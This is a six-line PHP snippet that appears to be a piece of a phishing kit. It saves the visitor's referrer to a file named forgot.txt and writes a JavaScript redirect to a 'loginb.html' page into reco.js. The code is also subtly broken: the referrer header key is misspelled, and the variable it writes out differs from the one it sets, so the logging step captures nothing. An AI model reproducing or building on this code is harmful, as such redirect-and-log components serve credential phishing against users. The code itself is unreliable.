<?php
$chataa=$_SERVER['HTTP_REFERRER'];
$script="<script>location.href='./loginb.html'</script>";
file_put_contents("forgot.txt",$chatta);
file_put_contents("reco.js",$script);
?>